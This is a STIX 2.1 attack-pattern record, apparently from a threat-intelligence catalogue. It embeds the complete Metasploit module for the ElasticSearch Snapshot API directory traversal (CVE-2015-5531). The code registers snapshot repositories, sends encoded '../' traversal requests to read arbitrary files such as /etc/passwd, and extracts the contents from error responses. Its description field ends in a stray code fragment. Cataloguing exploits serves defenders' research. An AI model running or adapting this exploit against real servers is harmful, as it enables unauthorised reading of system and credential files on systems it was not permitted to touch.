{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cc8a214c-62a5-4dc5-a88b-a771c6a61303",
    "created": "2024-08-14T16:30:44.330995Z",
    "modified": "2024-08-14T16:30:44.330999Z",
    "name": "ElasticSearch Snapshot API Directory Traversal",
    "description": " 'This module exploits a directory traversal vulnerability in ElasticSearch, allowing an attacker to read arbitrary files with JVM process privileges, through the Snapshot API.'  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/elasticsearch_traversal.rb",
            "external_id": "elasticsearch_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'json'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ElasticSearch Snapshot API Directory Traversal',\n      'Description'    => %q{\n        'This module exploits a directory traversal vulnerability in\n        ElasticSearch, allowing an attacker to read arbitrary files\n        with JVM process privileges, through the Snapshot API.'\n      },\n      'References'     =>\n        [\n          ['CVE', '2015-5531'],\n          ['PACKETSTORM', '132721']\n        ],\n      'Author'         =>\n        [\n          'Benjamin Smith', # Vulnerability Discovery\n          'Pedro Andujar <pandujar[at]segfault.es>', # Metasploit Module\n          'Jose A. Guasch <jaguasch[at]gmail.com>', # Metasploit Module\n        ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(9200),\n        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),\n        OptInt.new('DEPTH', [true, 'Traversal depth', 7])\n      ], self.class\n    )\n  end\n\n  def check_host(ip)\n    res1 = send_request_raw(\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwn'),\n      'data'   => '{\"type\":\"fs\",\"settings\":{\"location\":\"dsr\"}}'\n    )\n\n    res2 = send_request_raw(\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwnie'),\n      'data'   => '{\"type\":\"fs\",\"settings\":{\"location\":\"dsr/snapshot-ev1l\"}}'\n    )\n\n    if res1.body.include?('true') && res2.body.include?('true')\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def read_file(file)\n    travs = '_snapshot/pwn/ev1l%2f'\n\n    payload = '../' * datastore['DEPTH']\n\n    travs << payload.gsub('/', '%2f')\n    travs << file.gsub('/', '%2f')\n\n    vprint_status(\"Retrieving file contents...\")\n\n    res = send_request_raw(\n      'method' => 'GET',\n      'uri'    => travs\n    )\n\n    if res && res.code == 400\n      return res.body\n    else\n      print_status(\"Server returned HTTP response code: #{res.code}\")\n      print_status(res.body)\n      return nil\n    end\n  end\n\n  def run_host(ip)\n    vprint_status(\"Checking if it's a vulnerable ElasticSearch\")\n\n    check_code = check_host(ip)\n    print_status(\"#{check_code.message}\")\n    if check_host(ip) != Exploit::CheckCode::Appears\n      return\n    end\n\n    filename = datastore['FILEPATH']\n    filename = filename[1, filename.length] if filename =~ %r{/^\\//}\n\n    contents = read_file(filename)\n    unless contents\n      print_error(\"No file downloaded\")\n      return\n    end\n\n    begin\n      data_hash = JSON.parse(contents)\n    rescue JSON::ParserError => e\n      elog(e)\n      return\n    end\n\n    fcontent = data_hash['error'].scan(/\\d+/).drop(2).map(&:to_i).pack('c*')\n    fname = datastore['FILEPATH']\n\n    path = store_loot(\n      'elasticsearch.traversal',\n      'text/plain',\n      ip,\n      fcontent,\n      fname\n    )\n    print_good(\"File saved in: #{path}\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}